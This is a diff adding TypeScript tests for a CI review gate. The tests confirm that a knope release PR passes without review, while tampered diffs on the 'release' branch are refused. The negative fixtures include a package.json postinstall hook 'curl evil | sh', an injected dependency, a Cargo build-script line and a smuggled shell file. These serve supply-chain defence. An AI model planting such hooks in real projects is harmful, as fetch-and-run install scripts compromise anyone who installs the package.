@@ -11,7 +11,7 @@ import { execFileSync } from 'node:child_process'
 import { checkRunsViolations, orchestratorSources, MISSING_CHECKS_FILE, REVIEW_AND_MERGE_FILE } from './forgery-rails.js'
 import { commitSha as commitShaOf } from '../../orchestrator/src/gh.js'
 import {
-  runReviewCi, decideReviewGate,
+  runReviewCi, decideReviewGate, CI_DIFF_FLAGS, REVIEW_GATE_STANDING, reviewGateFailsClosed,
   isRepublishOnlyEvent, reviewRequestFor, reviewRequestEventFromEnv, REVIEW_REQUEST_LOGIN,
   type CiContext, type ReviewCiDeps, type ReviewSetDecision,
 } from '../../orchestrator/src/ci.js'
@@ -19,6 +19,7 @@ import { DEFAULT_MAX_TURNS, HIGH_IMPACT_MAX_TURNS, DEFAULT_TIMEOUT_MS, HIGH_IMPA
 import { diffHash, cacheArtifactName, type ReviewCache, type CachedVerdict, type ReviewCacheKey } from '../../orchestrator/src/review-cache.js'
 import type { Lane } from '../../orchestrator/src/config.js'
 import { workspaceAliases } from '../../orchestrator/src/verify.js'
+import { knopeVersionedPaths, knopeChangelogPath, releasePrShape } from '../../orchestrator/src/release-shape.js'
 import type { VerifyReport } from '../../orchestrator/src/verify.js'
 
 describe('rail: a live lane must have a write scope', () => {
@@ -2621,6 +2622,229 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
       log: () => {},
     })
     expect(outcome.kind).toBe('review-set-unresolved')
+  })
+})
+
+/**
+ * Rail for the knope release PR (#1944): it concludes a REAL green with no
+ * review, and nothing else can reach that green.
+ *
+ * #1944 sat on `fleet/review: FAILED — this head's tree (836170ff…) has no
+ * verdict: the last PASS was earned on fa241912…, a different tree`
+ * (`tree-changed`, run 39943449486): knope force-pushes `release` onto a new
+ * tree on every merge to main, a push never starts a review, and a PASS for
+ * another tree covers nothing (#2014). The operator's ruling is that release
+ * PRs need no review; the gate says so as `release-pr`, keyed on STRUCTURE.
+ *
+ * Both directions are asserted, and the second is the one that matters: a
+ * match that was too broad would hand every PR a free pass. The diffs are
+ * produced by REAL `git diff` (with the gate's own `CI_DIFF_FLAGS`) over the
+ * repo's real version files and real `knope.toml` — not a hand-typed
+ * fixture that could drift from what knope actually writes.
+ */
+describe('rail: the knope release PR concludes green without a review, and nothing else can (#1944)', () => {
+  const TREE = 'a3655875dd861eb24ebf01708a07f4caa0995b43'
+  const gateTree = async (): Promise<string> => TREE
+  const noCache: ReviewCache = { async lookup() { return undefined }, async record() {} }
+  const KNOPE_TOML = readFileSync(join(process.cwd(), 'knope.toml'), 'utf8')
+
+  const sh = (cwd: string, ...args: string[]): string =>
+    execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...args], { encoding: 'utf8' })
+
+  const VERSIONED = knopeVersionedPaths(KNOPE_TOML)
+  const CURRENT = (JSON.parse(readFileSync(join(process.cwd(), 'package.json'), 'utf8')) as { version: string }).version
+  const NEXT = CURRENT.replace(/\d+$/, (n) => String(Number(n) + 1))
+
+  /** Real repo, real version files, real diff: base commit, then `mutate`. */
+  function realDiff(mutate: (dir: string) => void): { diff: string; files: string[] } {
+    const dir = mkdtempSync(join(tmpdir(), 'release-pr-rail-'))
+    try {
+      sh(dir, 'init', '-q', '-b', 'main')
+      const base = ['CHANGELOG.md', ...VERSIONED]
+      for (const p of base) {
+        const dest = join(dir, p)
+        execFileSync('mkdir', ['-p', dirname(dest)])
+        writeFileSync(dest, readFileSync(join(process.cwd(), p)))
+      }
+      sh(dir, 'add', '-A'); sh(dir, 'commit', '-q', '-m', 'base')
+      mutate(dir)
+      sh(dir, 'add', '-A'); sh(dir, 'commit', '-q', '-m', 'head')
+      const flags = [...CI_DIFF_FLAGS]
+      return {
+        diff: sh(dir, 'diff', ...flags, 'HEAD~1...HEAD'),
+        files: sh(dir, 'diff', '--name-only', 'HEAD~1...HEAD').split('\n').filter((l) => l.length > 0),
+      }
+    } finally { rmSync(dir, { recursive: true, force: true }) }
+  }
+
+  /** What `knope prepare-release` does: swap the version in each versioned file, prepend a changelog section. */
+  function knopeBump(dir: string, skip: readonly string[] = []): void {
+    for (const p of VERSIONED) {
+      if (skip.includes(p)) continue
+      const f = join(dir, p)
+      writeFileSync(f, readFileSync(f, 'utf8').replaceAll(`"${CURRENT}"`, `"${NEXT}"`).replaceAll(`>${CURRENT}<`, `>${NEXT}<`))
+    }
+    const log = join(dir, 'CHANGELOG.md')
+    writeFileSync(log, `# Changelog\n\n## ${NEXT} (2026-10-23)\n\n### Fixes\n\n- something crypto-ish\n\n${readFileSync(log, 'utf8').replace(/^# Changelog\n+/, '')}`)
+  }
+
+  const release = realDiff((d) => knopeBump(d))
+
+  const earnedPass = { kind: 'found' as const, earned: { verdict: 'PASS' as const, headSha: 'fa24191', runUrl: 'https://example/run/1', text: 'VERDICT: PASS (earlier tree)' } }
+
+  const gate = (o: {
+    branch?: string; diff?: string; files?: string[]; republishOnly?: boolean; requested?: boolean
+    fromLabels?: string[]; profiles?: string[]; knopeConfig?: (() => Promise<string>) | null; prAuthor?: string
+  } = {}) => decideReviewGate({
+    ctx: { branch: o.branch ?? 'release', repoDir: '/base', headDir: '/tmp/head', baseSha: 'b', headSha: 'h', pr: '1944' },
+    headTree: gateTree, prDiff: async () => o.diff ?? release.diff, changedFiles: async () => o.files ?? release.files,
+    cacheFor: () => noCache, requested: o.requested ?? false, republishOnly: o.republishOnly ?? true,
+    lastVerdict: async () => earnedPass,
+    ...(o.prAuthor === undefined ? {} : { prAuthor: o.prAuthor }),
+    ...(o.knopeConfig === null ? {} : { knopeConfig: o.knopeConfig ?? (async () => KNOPE_TOML) }),
+    reviewSet: async () => ({ ok: true, profiles: o.profiles ?? [], fromLabels: o.fromLabels ?? [], reasons: [] }),
+    log: () => {},
+  })
+
+  it('reads the versioned files from knope.toml: all of them exist, and package.json comes first', () => {
+    expect(VERSIONED[0]).toBe('package.json')
+    expect(VERSIONED.length).toBeGreaterThanOrEqual(7)
+    for (const p of VERSIONED) expect(existsSync(join(process.cwd(), p)), p).toBe(true)
+    expect(knopeChangelogPath(KNOPE_TOML)).toBe('CHANGELOG.md')
+  })
+
+  // ── (a) a release PR goes green ───────────────────────────────────────
+  it('(a) knope\'s real release diff concludes release-pr on the PUSH that used to be tree-changed red', async () => {
+    // Pre-fix this exact input — a push over a new tree, with a PASS earned on
+    // another — was `tree-changed`: the #1944 failure. Asserted both ways below.
+    const o = await gate({ republishOnly: true })
+    expect(o.kind).toBe('release-pr')
+    if (o.kind !== 'release-pr') throw new Error('unreachable')
+    expect([o.from, o.to]).toEqual([CURRENT, NEXT])
+    expect(REVIEW_GATE_STANDING['release-pr']).toBe('no-review-needed')
+    expect(reviewGateFailsClosed('release-pr')).toBe(false)
+  })
+
+  it('(a) is the same on a requested review — the operator\'s ruling is no review at all, not a review on demand', async () => {
+    expect((await gate({ republishOnly: false, requested: true })).kind).toBe('release-pr')
+  })
+
+  it('(a) the changelog prose pulling the crypto reviewer into the set is noise for a version-only diff', async () => {
+    expect((await gate({ profiles: ['crypto-security-reviewer'] })).kind).toBe('release-pr')
+  })
+
+  // ── (b) nothing else can reach that green ─────────────────────────────
+  it('(b) the IDENTICAL diff on any other branch is not a release PR — the pre-fix red, unchanged', async () => {
+    for (const branch of ['fleet/shared/1', 'feat/release', 'releases', 'release-0.19.20', 'main']) {
+      expect((await gate({ branch })).kind, branch).toBe('tree-changed')
+    }
+    expect((await gate({ branch: 'fleet/shared/1', republishOnly: false, requested: false })).kind).toBe('not-requested')
+  })
+
+  it('(b) a PR author cannot make it release-pr either way: the branch + shape decide, not who opened it', async () => {
+    expect((await gate({ branch: 'fleet/shared/1', prAuthor: 'llamenos-auto' })).kind).toBe('tree-changed')
+  })
+
+  it('(b) a branch named "release" carrying ANY other change is refused', async () => {
+    const tampered: Array<[string, (d: string) => void]> = [
+      ['a code file alongside the bump', (d) => { knopeBump(d); execFileSync('mkdir', ['-p', join(d, 'apps/worker')]); writeFileSync(join(d, 'apps/worker/evil.ts'), 'export const x = 1\n') }],
+      ['a workflow alongside the bump', (d) => { knopeBump(d); execFileSync('mkdir', ['-p', join(d, '.github/workflows')]); writeFileSync(join(d, '.github/workflows/x.yml'), 'on: push\n') }],
+      ['a dependency added in package.json', (d) => {
+        knopeBump(d)
+        const f = join(d, 'package.json')
+        writeFileSync(f, readFileSync(f, 'utf8').replace('"dependencies": {', '"dependencies": {\n    "evil-pkg": "1.0.0",'))
+      }],
+      ['a script changed in package.json', (d) => {
+        knopeBump(d)
+        const f = join(d, 'package.json')
+        writeFileSync(f, readFileSync(f, 'utf8').replace('"scripts": {', '"scripts": {\n    "postinstall": "curl evil | sh",'))
+      }],
+      ['a non-version line changed in Cargo.toml', (d) => {
+        knopeBump(d)
+        const f = join(d, 'apps/desktop/Cargo.toml')
+        writeFileSync(f, readFileSync(f, 'utf8').replace('[package]', '[package]\nbuild = "evil.rs"'))
+      }],
+      ['a downgrade', (d) => {
+        for (const p of VERSIONED) {
+          const f = join(d, p)
+          writeFileSync(f, readFileSync(f, 'utf8').replaceAll(`"${CURRENT}"`, '"0.0.1"').replaceAll(`>${CURRENT}<`, '>0.0.1<'))
+        }
+      }],
+      ['a versioned file bumped to a DIFFERENT version', (d) => {
+        knopeBump(d)
+        const f = join(d, 'deploy/helm/llamenos/Chart.yaml')
+        writeFileSync(f, readFileSync(f, 'utf8').replace(`"${NEXT}"`, '"9.9.9"'))
+      }],
+      ['the changelog loses a line', (d) => { knopeBump(d); const f = join(d, 'CHANGELOG.md'); writeFileSync(f, readFileSync(f, 'utf8').split('\n').slice(0, -3).join('\n')) }],
+      ['a versioned file deleted', (d) => { knopeBump(d); rmSync(join(d, 'deploy/helm/llamenos/Chart.yaml')) }],
+    ]
+    for (const [label, mutate] of tampered) {
+      const bad = realDiff(mutate)
+      expect((await gate({ diff: bad.diff, files: bad.files })).kind, label).toBe('tree-changed')
+    }
+    // A changelog-only edit has no version bump, so it is not a release diff —
+    // it is a docs change, which the ordinary gate already concludes green on
+    // its own terms (`low-tier`). The point is the name: never `release-pr`.
+    const docsOnly = realDiff((d) => writeFileSync(join(d, 'CHANGELOG.md'), `new line\n${readFileSync(join(d, 'CHANGELOG.md'), 'utf8')}`))
+    expect((await gate({ diff: docsOnly.diff, files: docsOnly.files })).kind).toBe('low-tier')
+  })
+
+  it('(b) a dependency line that merely carries the old version string cannot ride along a version swap', () => {
+    const hunk = (path: string, pairs: Array<[string, string]>): string =>
+      `diff --git a/${path} b/${path}\nindex ${'1'.repeat(40)}..${'2'.repeat(40)} 100644\n--- a/${path}\n+++ b/${path}\n@@ -1,9 +1,9 @@\n` +
+      pairs.map(([a, b]) => `-${a}\n+${b}`).join('\n') + '\n'
+    const files = ['package.json', 'apps/desktop/Cargo.toml']
+    const pkg = hunk('package.json', [[`  "version": "${CURRENT}",`, `  "version": "${NEXT}",`]])
+    const ok = pkg + hunk('apps/desktop/Cargo.toml', [[`version = "${CURRENT}"`, `version = "${NEXT}"`]])
+    expect(releasePrShape({ branch: 'release', diff: ok, changedFiles: files, knopeToml: KNOPE_TOML }).ok).toBe(true)
+    const smuggled = pkg + hunk('apps/desktop/Cargo.toml', [
+      [`version = "${CURRENT}"`, `version = "${NEXT}"`],
+      [`evil = { version = "${CURRENT}" }`, `evil = { version = "${NEXT}" }`],
+    ])
+    const r = releasePrShape({ branch: 'release', diff: smuggled, changedFiles: files, knopeToml: KNOPE_TOML })
+    expect(r.ok).toBe(false)
+    const dep = pkg + hunk('apps/desktop/Cargo.toml', [[`evil = { version = "${CURRENT}" }`, `evil = { version = "${NEXT}" }`]])
+    expect(releasePrShape({ branch: 'release', diff: dep, changedFiles: files, knopeToml: KNOPE_TOML }).ok).toBe(false)
+  })
+
+  it('(b) a diff that is the release diff PLUS a smuggled file is refused even when the changed-file list lies', async () => {
+    const bad = realDiff((d) => { knopeBump(d); writeFileSync(join(d, 'evil.sh'), 'x\n') })
+    expect((await gate({ diff: bad.diff, files: release.files })).kind).toBe('tree-changed')
+    expect((await gate({ diff: release.diff, files: [...release.files, 'evil.sh'] })).kind).toBe('tree-changed')
+  })
+
+  it('(b) a label is a deliberate request for a reviewer and outranks the release path', async () => {
+    const o = await gate({ fromLabels: ['crypto-security-reviewer'], profiles: ['crypto-security-reviewer'] })
+    expect(o.kind).toBe('tree-changed')
+  })
+
+  it('(b) fails toward the ordinary gate when knope.toml is unreadable, absent, or lists nothing', async () => {
+    expect((await gate({ knopeConfig: null })).kind).toBe('tree-changed')
+    expect((await gate({ knopeConfig: async () => { throw new Error('ENOENT') } })).kind).toBe('tree-changed')
+    expect((await gate({ knopeConfig: async () => '[package]\nchangelog = "CHANGELOG.md"\n' })).kind).toBe('tree-changed')
+    expect((await gate({ knopeConfig: async () => 'versioned_files = [\n  "package.json",\n' })).kind).toBe('tree-changed')
+  })
+
+  it('(b) an unresolvable review set still fails closed AHEAD of the release path (invariant 4)', async () => {
+    const o = await decideReviewGate({
+      ctx: { branch: 'release', repoDir: '/base', headDir: '/tmp/head', baseSha: 'b', headSha: 'h', pr: '1944' },
+      headTree: gateTree, prDiff: async () => release.diff, changedFiles: async () => release.files,
+      cacheFor: () => noCache, requested: false, republishOnly: true, knopeConfig: async () => KNOPE_TOML,
+      reviewSet: async () => ({ ok: false, reason: 'labels unreadable' }), log: () => {},
+    })
+    expect(o.kind).toBe('review-set-unresolved')
+  })
+
+  // ── the wiring that makes (a) a CHECK conclusion, not just a return value ──
+  it('the gate step is wired to the base knope.toml, and the naming step gives release-pr its own PASS name', () => {
+    const cli = readFileSync(join(process.cwd(), 'orchestrator/src/cli.ts'), 'utf8')
+    expect(cli).toMatch(/knopeConfig:\s*async\s*\(\)\s*=>\s*readFileSync\(join\(REPO_ROOT, 'knope\.toml'\)/)
+    const wf = readFileSync(join(process.cwd(), '.github/workflows/fleet-review.yml'), 'utf8')
+    expect(wf).toContain('release-pr) token="PASS:release-pr" ;;')
+    expect(wf).toContain('PASS:release-pr) detail=')
+    // The no-job-level-`if:` invariant (#844/#848) is pinned elsewhere; this
+    // is the release path's half: it is a step OUTCOME, never a skip.
+    expect(wf).not.toMatch(/^  fleet-review:\n(?:    [^\n]*\n)*?    if:/m)
   })
 })
 
